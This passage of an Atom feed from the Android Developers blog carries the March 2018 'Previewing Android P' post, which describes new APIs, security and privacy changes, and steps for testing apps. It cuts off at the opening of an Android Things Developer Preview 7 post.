      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/03/cryptography-changes-in-android-p.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-4987441021030014895</id>
    <published>2018-03-07T10:09:00.000-08:00</published>
    <updated>2018-03-09T12:57:25.928-08:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="androidp"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Develop"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Featured"/>
    <title type="text">Previewing Android P</title>
    <content type="html">&lt;em&gt;Posted by Dave Burke, VP of Engineering&lt;/em&gt;



&lt;a href="https://3.bp.blogspot.com/-yjp7X2zK0S8/Wp2Atb3uzgI/AAAAAAAAFHY/C89cA9g_K9gMAAyGw3Q9R9DbfXWqQYcLQCLcBGAs/s1600/image7.png" imageanchor="1" &gt;&lt;img id="plogo" border="0" src="https://3.bp.blogspot.com/-yjp7X2zK0S8/Wp2Atb3uzgI/AAAAAAAAFHY/C89cA9g_K9gMAAyGw3Q9R9DbfXWqQYcLQCLcBGAs/s1600/image7.png" data-original-width="1038" data-original-height="872" /&gt;&lt;/a&gt;

&lt;p&gt;
Last week at Mobile World Congress we saw that Android's ecosystem of developers, device makers, and silicon partners continues to bring amazing experiences to users worldwide. 
&lt;/p&gt;
&lt;p&gt;
Looking ahead, today we're sharing the first developer preview of &lt;a href="https://developer.android.com/preview/index.html"&gt;Android P&lt;/a&gt;, the newest version of Android. It's an early baseline build for developers only -- you're our most trusted reviewers and testers ;-) Early feedback from our developer community is crucial in helping us evolve the platform to meet your needs. We'd love to get you started exercising the new features and APIs in P, and as always, we depend on your early feedback and ideas, so please &lt;a href="https://developer.android.com/preview/feedback.html"&gt;give us your input&lt;/a&gt;!
&lt;/p&gt;
&lt;p&gt;
This first developer preview of Android P is just the start - we'll have lots more to share at &lt;a href="https://events.google.com/io/"&gt;Google I/O&lt;/a&gt; in May, stay tuned!
&lt;/p&gt;
&lt;h2 id="header2"&gt;New features to try in your apps&lt;/h2&gt;

&lt;p&gt;
Here's a look at some of the cool features in this first preview of Android P that we want you to try and &lt;a href="https://developer.android.com/preview/feedback.html"&gt;give feedback on&lt;/a&gt;&lt;em&gt;.&lt;/em&gt;
&lt;/p&gt;

&lt;a href="https://3.bp.blogspot.com/-9VwqCiztz0o/Wp2GDwuos9I/AAAAAAAAFIM/6QmaP1_hDqQowE8GfvBxLtOGaO73QbclACLcBGAs/s1600/image4.png" imageanchor="1" &gt;&lt;img id="plogo" border="0" src="https://3.bp.blogspot.com/-9VwqCiztz0o/Wp2GDwuos9I/AAAAAAAAFIM/6QmaP1_hDqQowE8GfvBxLtOGaO73QbclACLcBGAs/s1600/image4.png" data-original-width="716" data-original-height="1488" /&gt;&lt;/a&gt;

&lt;h3&gt;&lt;strong&gt;Indoor positioning with Wi-Fi RTT&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
Accurate indoor positioning has been a long-standing challenge that opens new opportunities for location-based services. Android P adds platform support for the IEEE 802.11mc WiFi protocol -- also known as WiFi Round-Trip-Time (RTT) -- to let you take advantage of indoor positioning in your apps.
&lt;/p&gt;
&lt;p&gt;
On Android P devices with hardware support, location permission, and location enabled, your apps can use &lt;a href="https://developer.android.com/reference/android/net/wifi/rtt/package-summary.html"&gt;RTT APIs&lt;/a&gt; to measure the distance to nearby WiFi Access Points (APs). The device doesn't need to connect to the APs to use RTT, and to maintain privacy, only the phone is able to determine the distance, not the APs. 
&lt;/p&gt;
&lt;p&gt;
Knowing the distance to 3 or more APs, you can calculate the device position with an accuracy of 1 to 2 meters. With this accuracy, you can build new experiences like in-building navigation; fine-grained location-based services such as disambiguated voice control (e.g.,'Turn on this light'); and location-based information (e.g., 'Are there special offers for this product?').
&lt;/p&gt;


&lt;h3&gt;&lt;strong&gt;Display cutout support&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
Now apps can take full advantage of the latest device screens with fullscreen content. We've added display cutout into the platform, along with APIs that you can use to manage how your content is displayed. 
&lt;/p&gt;
&lt;p&gt;
Cutout support works seamlessly for apps, with the system managing status bar height to separate your content from the cutout. If you have critical, immersive content, you can also use &lt;a href="https://developer.android.com/reference/android/view/DisplayCutout.html"&gt;new APIs&lt;/a&gt; to check the cutout shape and request full-screen layout  around it. You can check whether the current device has a cutout by calling &lt;a href="https://developer.android.com/reference/android/view/WindowInsets.html#getDisplayCutout()"&gt;getDisplayCutout()&lt;/a&gt;, and then determine the location and shape of the cutout area using &lt;a href="https://developer.android.com/reference/android/view/DisplayCutout.html"&gt;DisplayCutout&lt;/a&gt;. A new window layout attribute, &lt;a href="https://developer.android.com/reference/android/view/WindowManager.LayoutParams.html#layoutInDisplayCutoutMode"&gt;layoutInDisplayCutoutMode&lt;/a&gt;, lets you tell the system how and when lay out your  content relative to the cutout area. Details are &lt;a href="https://developer.android.com/preview/features.html#cutout"&gt;here&lt;/a&gt;. 
&lt;/p&gt;
&lt;p&gt;
To make it easier to build and test cutout support in your app, we've added a Developer Option that simulates a cutout on any device. We recommend testing your existing apps with display cutout enabled to ensure that your content displays properly. 
&lt;/p&gt;

&lt;a href="https://1.bp.blogspot.com/-j3yOwrJP0j8/Wp2FS6SxqJI/AAAAAAAAFH8/XVl-kawihW4Z2fETXMFu82ThWoAdkB2dwCLcBGAs/s1600/image3.png" imageanchor="1" &gt;&lt;img id="pimg" border="0" src="https://1.bp.blogspot.com/-j3yOwrJP0j8/Wp2FS6SxqJI/AAAAAAAAFH8/XVl-kawihW4Z2fETXMFu82ThWoAdkB2dwCLcBGAs/s1600/image3.png" data-original-width="1600" data-original-height="801" /&gt;&lt;/a&gt;

&lt;p id="pcaption"&gt;Apps with immersive content can display content fullscreen on devices with a display cutout.&lt;/p&gt;

&lt;h3&gt;Improved messaging notifications&lt;/h3&gt;
&lt;p&gt;
In Android P we've put a priority on improving visibility and function in notifications. Try the new &lt;a href="https://developer.android.com/reference/android/app/Notification.MessagingStyle.html"&gt;MessagingStyle&lt;/a&gt; notification style -- it highlights who is messaging and how you can reply. You can show conversations, attach photos and stickers, and even suggest smart replies. See the details &lt;a href="https://developer.android.com/preview/features.html#notifications"&gt;here&lt;/a&gt;. 
&lt;/p&gt;

&lt;div id="pflex1parent"&gt;

&lt;a id="pflex1child" href="https://4.bp.blogspot.com/-Zi4PJ1iz0xI/Wp2B4KiaAHI/AAAAAAAAFHk/jUYFMdCz_TMZbnPLlJDHPIj2T9IhBNspACLcBGAs/s1600/image5.png" imageanchor="1" &gt;&lt;img id="pimg" border="0" src="https://4.bp.blogspot.com/-Zi4PJ1iz0xI/Wp2B4KiaAHI/AAAAAAAAFHk/jUYFMdCz_TMZbnPLlJDHPIj2T9IhBNspACLcBGAs/s1600/image5.png" data-original-width="530" data-original-height="728" /&gt;&lt;/a&gt;

&lt;a id="pflex1child" href="https://1.bp.blogspot.com/-65UfC_qbcqk/Wp2B9Hk4lQI/AAAAAAAAFHo/sPsFt1-ip7s_RYuM0-4v11-p7glMTKMkwCLcBGAs/s1600/image8.png" imageanchor="1" &gt;&lt;img id="pimg" border="0" src="https://1.bp.blogspot.com/-65UfC_qbcqk/Wp2B9Hk4lQI/AAAAAAAAFHo/sPsFt1-ip7s_RYuM0-4v11-p7glMTKMkwCLcBGAs/s1600/image8.png" data-original-width="530" data-original-height="728" /&gt;&lt;/a&gt;

&lt;/div&gt;


&lt;p id="pcaption"&gt;
In MessagingStyle notifications you can now show conversations and smart replies [left] and even attach images and stickers [right].
&lt;/p&gt;


&lt;h3&gt;&lt;strong&gt;Multi-camera API&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
You can now access streams simultaneously from &lt;a href="https://developer.android.com/reference/android/hardware/camera2/CameraMetadata.html#REQUEST_AVAILABLE_CAPABILITIES_LOGICAL_MULTI_CAMERA"&gt;two or more physical cameras&lt;/a&gt; on devices running Android P. On devices with either dual-front or dual-back cameras, you can create innovative features not possible with just a single camera, such as seamless zoom, bokeh, and stereo vision. The API also lets you call a logical or fused camera stream that automatically switches between two or more cameras. We're looking forward to seeing your new and exciting creations as Android P devices supporting multiple cameras reach the market in the year ahead. 
&lt;/p&gt;
&lt;p&gt;
Other improvements in camera include new &lt;a href="https://developer.android.com/reference/android/hardware/camera2/params/SessionConfiguration.html"&gt;Session parameters&lt;/a&gt; that help to reduce delays during initial capture, and Surface sharing that lets camera clients handle various use-cases without the need to stop and start camera streaming. We've also added APIs for display-based &lt;a href="https://developer.android.com/reference/android/hardware/camera2/CameraMetadata.html#CONTROL_AE_MODE_ON_EXTERNAL_FLASH"&gt;flash support&lt;/a&gt; and access to &lt;a href="https://developer.android.com/reference/android/hardware/camera2/CaptureResult.html#STATISTICS_OIS_TIMESTAMPS"&gt;OIS timestamps&lt;/a&gt; for app-level image stabilization and special effects. 
&lt;/p&gt;


&lt;h3&gt;&lt;strong&gt;ImageDecoder for bitmaps and drawables&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
Android P gives you an easier way to decode images to bitmaps or drawables -- &lt;a href="https://developer.android.com/reference/android/graphics/ImageDecoder.html"&gt;ImageDecoder&lt;/a&gt;, which deprecates &lt;a href="https://developer.android.com/reference/android/graphics/BitmapFactory.html"&gt;BitmapFactory&lt;/a&gt;. ImageDecoder lets you create a bitmap or drawable from a byte buffer, file, or URI. It offers several advantages over BitmapFactory, including support for exact scaling, single-step decoding to hardware memory, support for post-processing in decode, and decoding of animated images.
&lt;/p&gt;
&lt;p&gt;
You can decode and scale to an exact size just by calling &lt;a href="https://developer.android.com/reference/android/graphics/ImageDecoder.html#setResize(int, int)"&gt;setResize()&lt;/a&gt; with the target dimensions. You can also call &lt;a href="https://developer.android.com/reference/android/graphics/ImageDecoder.html#getSampledSize(int)"&gt;getSampledSize()&lt;/a&gt; to get the image dimensions at a specific sample rate, then scale to those dimensions. If you want post-process an image -- such as applying rounded corners for circle masks or more complicated effects -- you can pass ImageDecoder any &lt;a href="https://developer.android.com/reference/android/graphics/ImageDecoder.html#setPostProcessor(android.graphics.PostProcessor)"&gt;android.graphics.PostProcessor&lt;/a&gt;. You can also create Drawables directly, with &lt;a href="https://developer.android.com/reference/android/graphics/ImageDecoder.html#decodeDrawable(android.graphics.ImageDecoder.Source, android.graphics.ImageDecoder.OnHeaderDecodedListener)"&gt;ImageDecoder.decodeDrawable()&lt;/a&gt;. If the encoded image is an animated GIF or WebP, the Drawable will be an instance of the new &lt;a href="https://developer.android.com/reference/android/graphics/drawable/AnimatedImageDrawable.html"&gt;AnimatedImageDrawable&lt;/a&gt;.  
&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;HDR VP9 Video, HEIF image compression, and Media APIs&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
Android P adds built-in support for HDR VP9 Profile 2, so you can now deliver HDR-enabled movies to your users from YouTube, Play Movies, and other sources on HDR-capable devices.
&lt;/p&gt;
&lt;p&gt;
We're excited to add &lt;a href="https://developer.android.com/reference/android/media/MediaFormat.html#MIMETYPE_IMAGE_ANDROID_HEIC"&gt;HEIF&lt;/a&gt; (heic) image encoding to the platform. HEIF is a popular format for photos that improves compression to save on storage and network data. With platform support on Android P devices, it's easy to send and utilize HEIF images from your backend server. Once you've made sure that your app is compatible with this data format for sharing and display, give HEIF a try as an image storage format in your app. You can do a jpeg-to-heic conversion using &lt;a href="https://developer.android.com/reference/android/graphics/ImageDecoder.html"&gt;ImageDecoder&lt;/a&gt; or &lt;a href="https://developer.android.com/reference/android/graphics/BitmapFactory.html"&gt;BitmapFactory&lt;/a&gt; to obtain a bitmap from jpeg, and you can use &lt;a href="https://developer.android.com/reference/androidx/heifwriter/HeifWriter.html"&gt;HeifWriter&lt;/a&gt; in the new Support Library alpha to write HEIF still images from YUV byte buffer, Surface, or Bitmap.
&lt;/p&gt;
&lt;p&gt;
We're also in the process of enhancing and refactoring the media APIs to make them easier to develop and integrate with -- watch for details coming later this year.
&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Data cost sensitivity in JobScheduler&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
&lt;a href="https://developer.android.com/reference/android/app/job/JobScheduler.html"&gt;JobScheduler&lt;/a&gt; is Android's central service to help you manage scheduled tasks or work across &lt;a href="https://developer.android.com/training/monitoring-device-state/doze-standby.html#understand_doze"&gt;Doze&lt;/a&gt;, &lt;a href="https://developer.android.com/training/monitoring-device-state/doze-standby.html#understand_app_standby"&gt;App Standby&lt;/a&gt;, and &lt;a href="https://developer.android.com/about/versions/oreo/background.html"&gt;Background Limits&lt;/a&gt; changes. In Android P, JobScheduler handles network-related jobs better for the user, coordinating with network status signals provided separately by carriers. 
&lt;/p&gt;
&lt;p&gt;
Jobs can now declare their estimated data size, signal prefetching, and specify detailed network requirements—carriers can report networks as being congested or unmetered. JobScheduler then manages work according to the network status. For example, when a network is congested, JobScheduler might defer large network requests. When unmetered, it can run prefetch jobs to improve the user experience, such as by prefetching headlines. 
&lt;/p&gt;
&lt;p&gt;
When you are adding jobs, try using &lt;a href="https://developer.android.com/reference/android/app/job/JobInfo.Builder.html#setEstimatedNetworkBytes(long)"&gt;setEstimatedNetworkBytes()&lt;/a&gt;, &lt;a href="https://developer.android.com/reference/android/app/job/JobInfo.Builder.html#setIsPrefetch(boolean)"&gt;setIsPrefetch()&lt;/a&gt; and &lt;a href="https://developer.android.com/reference/android/app/job/JobInfo.Builder.html#setRequiredNetwork(android.net.NetworkRequest)"&gt;setRequiredNetwork()&lt;/a&gt; to let JobScheduler handle the work properly. When your job executes, be sure to use the Network object returned by &lt;a href="https://developer.android.com/reference/android/app/job/JobParameters.html#getNetwork()"&gt;JobParameters.getNetwork()&lt;/a&gt;, otherwise you'll implicitly use the device's default network which may not meet your requirements, causing unintended data usage.
&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Neural Networks API 1.1&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
We introduced the &lt;a href="https://developer.android.com/ndk/guides/neuralnetworks/index.html"&gt;Neural Networks API&lt;/a&gt; in Android 8.1 to accelerate on-device machine learning on Android. In Android P we're expanding and improving this API, adding support for nine new ops -- Pad, BatchToSpaceND, SpaceToBatchND, Transpose, Strided Slice, Mean, Div, Sub, and Squeeze. If you have a Pixel 2 device, the DP1 build now includes an Qualcomm Hexagon HVX driver with acceleration for quantized models.  
&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Autofill improvements&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
In Android P we're continuing to improve the Autofill Framework based on feedback from users and developers. Along with key bugfixes, this release includes new APIs that allow password managers to improve the Autofill user experience, such as better &lt;a href="https://developer.android.com/preview/features/autofill.html#aff-dataset-filtering"&gt;dataset filtering&lt;/a&gt;, &lt;a href="https://developer.android.com/preview/features/autofill.html#af-sanitization"&gt;input sanitization&lt;/a&gt;, and &lt;a href="https://developer.android.com/preview/features/autofill.html#compat-mode"&gt;compatibility mode&lt;/a&gt;. Compatibility mode in particular has a high impact on end users because it lets password managers take the accessibility-based approach in apps that don't yet have full Autofill support, but without impacts on performance or security. See all the details on what's new &lt;a href="https://developer.android.com/preview/features/autofill.html"&gt;here&lt;/a&gt;.
&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Open Mobile API for NFC payments and secure transactions&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
Android P adds an implementation of the &lt;a href="https://www.globalplatform.org/"&gt;GlobalPlatform Open Mobile API&lt;/a&gt; to Android. On supported devices, apps can use the &lt;a href="https://developer.android.com/reference/android/se/omapi/package-summary.html"&gt;OMAPI API&lt;/a&gt; to access secure elements (SE) to enable smart-card payments and other secure services. A hardware abstraction layer (HAL) provides the underlying API for enumerating a variety of Secure Elements (eSE, UICC, and others) available.
&lt;/p&gt;
&lt;h2 id="header2"&gt;Strengthening Android's foundations&lt;/h2&gt;


&lt;p&gt;
In Android P we're continuing our long-term investment to make Android the best platform for developers.
&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Security for apps&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
In Android P we're moving to a more consistent UI for fingerprint authentication across apps and devices. Android now provides a standard system dialog to prompt the user to touch the fingerprint sensor, managing text and placement as appropriate for the device. Apps can trigger the system fingerprint dialog using a new &lt;a href="https://developer.android.com/reference/android/hardware/fingerprint/FingerprintDialog.html"&gt;FingerprintDialog&lt;/a&gt; API. We recommend switching to the new system dialog as soon as possible. 
&lt;/p&gt;
&lt;p&gt;
As part of a larger effort to move all network traffic away from cleartext (unencrypted HTTP) to TLS, we're also changing the defaults for &lt;a href="https://developer.android.com/training/articles/security-config.html"&gt;Network Security Configuration&lt;/a&gt; to block all cleartext traffic. You'll now need to make connections over TLS, unless you explicitly opt-in to cleartext for specific domains. 
&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Privacy for users&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
To better ensure privacy, Android P restricts access to mic, camera, and all &lt;a href="https://developer.android.com/reference/android/hardware/SensorManager.html#getSensors()"&gt;SensorManager&lt;/a&gt; sensors from apps that are idle. While your app's UID is idle, the mic reports empty audio and sensors stop reporting events. Cameras used by your app are disconnected and will generate an error if the app tries to use them. In most cases, these restrictions should not introduce new issues for existing apps, but we recommend removing these requests from your apps.
&lt;/p&gt;
&lt;p&gt;
We will also enable encryption of Android backups with a client-side secret. This feature is still in active development and will be launched in a future Android P preview release.
&lt;/p&gt;
&lt;p&gt;
Longer term we're working to bring support for per-network randomization of associated MAC addresses to the platform. On supported devices running Android P,  you can enable this experimentally for testing as a new developer option.
&lt;/p&gt;
&lt;p&gt;Android P also gives the user control over access to the platform's build.serial identifier by putting it behind the &lt;a href="https://developer.android.com/reference/android/Manifest.permission.html#READ_PHONE_STATE"&gt;READ_PHONE_STATE&lt;/a&gt; permission. Direct access to this identifier has been &lt;a href="https://developer.android.com/about/versions/oreo/android-8.0-changes.html#o-pri"&gt;deprecated since Android 8.0&lt;/a&gt;. In order to access the build.serial identifier, you should use the &lt;code&gt;&lt;a href="https://developer.android.com/reference/android/os/Build.html#getSerial()"&gt;Build.getSerial()&lt;/a&gt;&lt;/code&gt; method.&lt;/p&gt;


&lt;h3&gt;&lt;strong&gt;ART performance&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
We're working to bring performance and efficiency improvements to all apps through the ART runtime. We've expanded ART's use of execution profiles to optimize apps and reduce in-memory footprint of compiled app code. ART now uses profile information for on-device rewriting of DEX files, with reductions up to 11% across a range of popular apps. We expect these to correlate closely with reductions in system DEX memory usage and faster startup times for your apps.
&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Optimized Kotlin&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
Kotlin is a &lt;a href="https://developer.android.com/kotlin/index.html"&gt;first-class language on Android&lt;/a&gt;, and if you haven't tried it yet, you should! We've made an enduring commitment to Kotlin in Android and continue to expand support including optimizing the performance of Kotlin code. In P you'll see the first results of this work -- we've improved several compiler optimizations, especially those that target loops, to extract better performance.  We're also continuing to work in partnership with JetBrains to optimize Kotlin's generated code. You can get all of the latest Kotlin performance improvements just by keeping Android Studio's Kotlin plugin up-to-date.
&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Power efficiency&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
In Android P we continue to refine &lt;a href="https://developer.android.com/training/monitoring-device-state/doze-standby.html#understand_doze"&gt;Doze&lt;/a&gt;, &lt;a href="https://developer.android.com/training/monitoring-device-state/doze-standby.html#understand_app_standby"&gt;App Standby&lt;/a&gt;, and &lt;a href="https://developer.android.com/about/versions/oreo/background.html"&gt;Background Limits&lt;/a&gt; to further improve battery life; please be sure to try your apps with these and send feedback.
&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Targeting modern Android&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
Android P is shaped by our longer-term initiatives to modernize the foundations of Android and the apps that run on it. As we announced &lt;a href="https://android-developers.googleblog.com/2017/12/improving-app-security-and-performance.html"&gt;recently&lt;/a&gt;, Google Play will require all app updates to target Android Oreo (&lt;a href="https://developer.android.com/guide/topics/manifest/uses-sdk-element.html#target"&gt;targetSdkVersion&lt;/a&gt; 26 or higher) by November 2018, with support for 64-bit hardware on the horizon for 2019. 
&lt;/p&gt;
&lt;p&gt;
In line with these changes, Android P will warn users with a dialog when they install an app that targets a platform earlier than Android 4.2 (targetSdkVersion less than 17), and future platform versions will continue to increment that lower bound. We're encouraging every Android developer to start planning the migration to target API 26 now, and to start the migration work as soon as possible. Here's a &lt;a href="https://developer.android.com/distribute/best-practices/develop/target-sdk.html"&gt;checklist of resources&lt;/a&gt; for help and support -- we're looking forward to seeing your apps getting the most from modern Android.
&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Improving app compatibility through public APIs &lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
A key issue for users and developers is app compatibility -- making sure that apps are ready for new platform versions as they arrive, without risk of crashes for users and emergency rollouts for developers. Apps that use Android's public APIs from the SDK or NDK are in a good position to be compatible, but apps that use private Android interfaces and libraries are not.
&lt;/p&gt;
&lt;p&gt;
So with Android P we're starting a &lt;a href="https://android-developers.googleblog.com/2018/02/improving-stability-by-reducing-usage.html"&gt;gradual process&lt;/a&gt; to restrict access to selected non-SDK interfaces, asking developers -- including app teams inside Google -- to use the public equivalents instead. In cases where there is no public equivalent for your use-case, please &lt;a href="https://issuetracker.google.com/issues/new?component=328403&amp;template=1027267"&gt;let us know&lt;/a&gt; -- we want to make sure that this process is as smooth as possible for developers, so we'll use your feedback to ensure the initial rollout only affects APIs where developers can easily migrate to public alternatives. More about the &lt;a href="https://developer.android.com/preview/behavior-changes.html#compat"&gt;restrictions is here&lt;/a&gt;. 
&lt;/p&gt;
&lt;h2 id="header2"&gt;Get started in a few simple steps&lt;/h2&gt;


&lt;p&gt;
First, &lt;strong&gt;make your app compatible&lt;/strong&gt; to give your users a seamless transition to Android P. Just download a &lt;a href="https://developer.android.com/preview/download.html"&gt;device system image&lt;/a&gt; or emulator system image, install your current app, and test -- the app should run and look great, and handle &lt;a href="https://developer.android.com/preview/behavior-changes.html"&gt;behavior changes&lt;/a&gt; properly. After you've made any necessary updates, we recommend publishing to Google Play right away without changing the app's platform targeting.
&lt;/p&gt;
&lt;p&gt;
Remember, you don't need a supported Pixel device to test or develop on Android P.  For most uses we highly recommend &lt;strong&gt;&lt;a href="https://developer.android.com/preview/setup-sdk.html#run-emulator"&gt;setting up an Android Virtual Device&lt;/a&gt; on the Android Emulator &lt;/strong&gt;as a test environment instead. If you haven't tried the emulator recently, you'll find that it's incredibly fast , boots in under 6 seconds, convenient to use, and you can even model next-gen screens -- such as long screens and screens with camera cutout. 
&lt;/p&gt;

&lt;a href="https://2.bp.blogspot.com/-BRzqwaHKA9A/Wp2GQtqamyI/AAAAAAAAFIQ/2o9i-ubAl08QCanhrj4GRszLiruI-tQgQCLcBGAs/s1600/image2.png" imageanchor="1" &gt;&lt;img id="plogo" border="0" src="https://2.bp.blogspot.com/-BRzqwaHKA9A/Wp2GQtqamyI/AAAAAAAAFIQ/2o9i-ubAl08QCanhrj4GRszLiruI-tQgQCLcBGAs/s1600/image2.png" data-original-width="922" data-original-height="1494" /&gt;&lt;/a&gt;

&lt;p&gt;
Next, &lt;strong&gt;change your app's targeting to "P"&lt;/strong&gt; and run it with the full Android P experience. Set your app's targetSdkVersion to 'P' and compileSdkVersion to android-P, build, and test. Make sure to read the behavior changes for apps targeting P to find areas you will want to test and might need to adjust.
&lt;/p&gt;
&lt;p&gt;
When you're ready, &lt;strong&gt;dive into Android P&lt;/strong&gt; and learn about the many &lt;a href="https://developer.android.com/preview/api-overview.html"&gt;new features and APIs&lt;/a&gt; you can take advantage of in your app. To make it easier to explore the new APIs, take a look at the &lt;a href="https://developer.android.com/sdk/api_diff/p-dp1/changes.html"&gt;API diff report&lt;/a&gt;, along with the &lt;a href="https://developer.android.com/reference/packages.html"&gt;Android P API reference&lt;/a&gt;. Visit the &lt;a href="https://developer.android.com/preview/index.html"&gt;P Developer Preview site&lt;/a&gt; for details on the &lt;a href="https://developer.android.com/preview/overview.html"&gt;preview timeline&lt;/a&gt; and &lt;a href="https://developer.android.com/preview/feedback.html"&gt;support resources&lt;/a&gt;. Also check out &lt;a href="https://youtu.be/LBBqTd6uOd4"&gt;this video&lt;/a&gt; highlighting what's new in Android P for developers. 
&lt;/p&gt;
&lt;p&gt;
To get started building with Android P,  download the P Developer Preview SDK and tools into Android Studio 3.1 or use the latest &lt;a href="https://developer.android.com/preview/setup-sdk.html#get-studio"&gt;Android Studio 3.2&lt;/a&gt; canary version. We're also releasing an &lt;a href="https://developer.android.com/topic/libraries/support-library/revisions.html"&gt;alpha version of the 28.0.0 support library&lt;/a&gt; for you to try. 
&lt;/p&gt;
&lt;h2 id="header2"&gt;What's ahead?&lt;/h2&gt;


&lt;p&gt;
The Android P Developer Preview includes an updated SDK with system images for testing on the official Android Emulator and on Pixel, Pixel XL Pixel 2, and Pixel 2 XL devices. 
&lt;/p&gt;
&lt;p&gt;
We plan to update the preview system images and SDK regularly throughout the preview. This initial release is for developers only and not intended for daily or consumer use, so we're making it available by &lt;strong&gt;manual download and flash only&lt;/strong&gt;. &lt;a href="https://developer.android.com/preview/download.html"&gt;Downloads and instructions are here&lt;/a&gt;.
&lt;/p&gt;
&lt;p&gt;
As we get closer to a final product, we'll be inviting consumers to try it out as well, and we'll open up enrollments through Android Beta at that time. Stay tuned for details, but for now please note that Android Beta is not currently available for Android P.
&lt;/p&gt;
&lt;p&gt;
As always, your feedback is critical, so please &lt;a href="https://developer.android.com/preview/feedback.html"&gt;let us know what you think&lt;/a&gt; — the sooner we hear from you, the more of your feedback we can integrate. When you find issues, please &lt;a href="https://developer.android.com/preview/bug"&gt;report them here&lt;/a&gt;. We have separate hotlists for filing &lt;a href="https://issuetracker.google.com/issues/new?component=190602&amp;template=1024208"&gt;platform issues&lt;/a&gt;, &lt;a href="https://issuetracker.google.com/issues/new?component=190602&amp;template=1024202"&gt;app compatibility issues&lt;/a&gt;, and &lt;a href="https://issuetracker.google.com/issues/new?component=190602&amp;template=1024212"&gt;third-party SDK issues&lt;/a&gt;.
&lt;/p&gt;


&lt;style&gt;

#plogo {
float: right;
margin: 2%;
width: 50%;
}

#header2 {
font-size: 150%;
margin-bottom: 20px;
}

#pflex1parent {
display: flex;
justify-content: space-around;
align-items: center;
width: 100%;
}

#pflex1child {
width: 45%;
}

#pimg {
width: 100%;
margin: 10px 0 0 0;
}

#pcaption {
margin: 0 0 10px 0;
padding: 0;
font-style: italic;
font-size: 85%;
text-align: center;
}

&lt;/style&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=PxS4AtHIyDA:XIdecv5Aqn4:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=PxS4AtHIyDA:XIdecv5Aqn4:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=PxS4AtHIyDA:XIdecv5Aqn4:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/PxS4AtHIyDA" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/4987441021030014895"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/4987441021030014895"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/PxS4AtHIyDA/previewing-android-p.html" title="Previewing Android P"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://3.bp.blogspot.com/-yjp7X2zK0S8/Wp2Atb3uzgI/AAAAAAAAFHY/C89cA9g_K9gMAAyGw3Q9R9DbfXWqQYcLQCLcBGAs/s72-c/image7.png" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/03/previewing-android-p.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-33458597185895777</id>
    <published>2018-03-06T15:00:00.000-08:00</published>
    <updated>2018-03-06T15:00:01.835-08:00</updated>
    <title type="text">Android Things Developer Preview 7</title>
    <content type="html">&lt;em&gt;Posted by &lt;a href="https://google.com/+DaveSmithDev"&gt;Dave Smith&lt;/a&gt;, Developer Advocate for IoT&lt;/em&gt;

&lt;p&gt;
Today we're releasing Developer Preview 7 (DP7) of Android Things, Google's platform that enables Android developers to create Internet of Things (IoT) devices. The platform also supports powerful applications such as video and audio processing and on-board machine learning with TensorFlow.
&lt;/p&gt;
&lt;p&gt;
